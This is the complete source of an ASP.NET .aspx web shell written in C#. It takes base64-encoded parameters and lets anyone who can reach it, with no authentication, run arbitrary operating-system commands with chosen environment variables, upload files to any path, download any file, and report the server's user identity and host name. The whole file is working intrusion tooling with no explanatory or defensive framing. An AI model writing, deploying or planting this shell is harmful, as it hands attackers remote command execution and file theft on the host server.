<%@ Page Language="C#"%>
<script runat=server>

    private string b64d(string b64)
    {
        byte[] tmp = Convert.FromBase64String(b64);
        return System.Text.Encoding.UTF8.GetString(tmp);
    }

    private void pb64(string text, bool sep)
    {
        byte[] tmp = System.Text.Encoding.UTF8.GetBytes(text);
        Response.Write(Convert.ToBase64String(tmp));

        if (sep)
            Response.Write(":");
    }

    public void Page_Load(Object s, EventArgs e)
    {
        Response.Write(Request.Params["pattern"]);

        try {

            string cwd = System.IO.Directory.GetCurrentDirectory();
            string filename;
            byte[] content;

            if (!string.IsNullOrEmpty(Request.Params["chdir"]))
            {
                cwd = b64d(Request.Params["chdir"]);

                if (!System.IO.Directory.Exists(cwd)) {
                    Response.StatusCode = 202;
                    pb64("Error: Unable to change directory to " + cwd, false);
                    Response.Write(Request.Params["pattern"]);
                    return;
                }
            }

            switch (Request.Params["action"])
            {
                case "init":
                    pb64(System.IO.Path.DirectorySeparatorChar.ToString(), true);
                    pb64("aspx", true);
                    pb64(System.Security.Principal.WindowsIdentity.GetCurrent().Name, true);
                    pb64(System.Net.Dns.GetHostName(), true);
                    break;

                case "cmd":
                    string[] cmd_arr = b64d(Request.Params["b64_cmd"]).Split(new string[] {"<@:SEP:@>"}, System.StringSplitOptions.None);
                    string args = String.Join(" ", cmd_arr.Skip(1));

                    System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo(cmd_arr[0], args);
                    si.UseShellExecute  = false;
                    si.CreateNoWindow = true;
                    si.WorkingDirectory = cwd;
                    si.RedirectStandardOutput = true;
                    si.RedirectStandardError = true;

                    if (!string.IsNullOrEmpty(Request.Params["b64_env"]))
                    {
                        foreach (string b64_var in Request.Params["b64_env"].Split(':'))
                        {
                            string[] envvar = b64d(b64_var).Split('=');
                            if (envvar.Length == 2)
                                si.EnvironmentVariables[envvar[0]] = envvar[1];
                        }
                    }

                    System.Diagnostics.Process proc = System.Diagnostics.Process.Start(si);
                    string output = proc.StandardOutput.ReadToEnd();
                    string error = proc.StandardError.ReadToEnd();
                    proc.Close();
                    pb64(output + error, true);
                    break;

                case "upload":
                    content = Convert.FromBase64String(Request.Params["b64_upload"]);
                    filename = b64d(Request.Params["b64_filename"]);

                    if (System.IO.Directory.Exists(filename))
                        filename += System.IO.Path.DirectorySeparatorChar.ToString() + b64d(Request.Params["b64_orig"]);

                    System.IO.File.WriteAllBytes(filename, content);
                    break;

                case "download":
                    filename = b64d(Request.Params["b64_filename"]);
                    string b64 = Convert.ToBase64String(System.IO.File.ReadAllBytes(filename));
                    Response.Write(b64);
                    Response.Write(":");
                    break;
            }

            pb64(System.IO.Path.GetFullPath(cwd), false);
            
        } catch (Exception ex) {
            Response.StatusCode = 201;
            Response.Write("Caught unexpected " + ex.GetType().Name + ": " + ex.Message);
        }

        Response.Write(Request.Params["pattern"]);
    }
</script>
